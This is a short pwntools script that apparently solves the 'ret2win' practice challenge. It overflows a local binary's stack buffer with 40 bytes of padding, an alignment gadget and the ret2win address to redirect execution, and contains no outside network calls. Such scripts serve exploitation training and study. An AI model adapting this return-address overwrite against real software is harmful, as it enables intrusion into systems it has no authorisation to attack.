from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

p = start()

#x = cyclic(500)
#p.sendline(x)
#cyclic -l kaaa

padding = b'A' * 40
chain = padding
chain += p64(0x40053e) # ret for alignemnet
chain += p64(e.sym['ret2win'])

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

